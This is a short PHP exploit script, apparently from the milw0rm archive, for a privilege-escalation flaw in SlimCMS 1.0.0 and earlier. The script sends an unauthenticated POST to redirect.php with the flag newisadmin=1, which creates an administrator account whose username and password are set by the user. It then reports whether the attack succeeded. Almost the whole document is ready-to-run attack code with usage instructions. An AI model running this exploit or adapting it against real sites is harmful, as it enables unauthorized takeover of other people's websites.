#!/usr/bin/php -q
<?php

/*
   SlimCMS <= 1.0.0 Privilege Escalation Exploit
   Discovered By StAkeR aka athos - StAkeR[at]hotmail[dot]it
   Discovered On 11/10/2008
   http://downloads.sourceforge.net/slimcms/SlimCMS-1.0.0.tgz?modtime=1217343227&big_mirror=0
*/


error_reporting(0);

$host = $argv[1];
$host = str_replace('http://',NULL,$host);
$path = $argv[2]."/redirect.php";
$user = $argv[3];

if(!preg_match('/http:\/\/(.+?)$/',$host) and strlen($user) < 5)
{
  echo "[?] Usage: php $argv[0][host][path][username]\r\n";
  echo "[?] Usage: php $argv[0] http://localhost /cms milw0rm\r\n";
  exit;
}

if(!$sock = fsockopen($host,80)) 
{
  die("Socket Error\r\n");
}

$post .= "newusername=$user&newpassword=$user&newisadmin=1";
$data .= "POST /$path HTTP/1.1\r\n";
$data .= "Host: $host\r\n";
$data .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
$data .= "Content-Length: ".strlen($post)."\r\n";
$data .= "Connection: close\r\n\r\n";
$data .= "$post\r\n\r\n";

fputs($sock,$data);

while(!feof($sock)) 
{
  $content .= fgets($sock);
} fclose($sock); 

if(eregi('change.php',$content))
{
  echo "[?] Added New Administrator!\r\n";
  echo "[?] Username and Password: $user\r\n";
  exit;
}
else
{
  echo "[?] Exploit Failed!\n";
}


?>

# milw0rm.com [2008-10-10]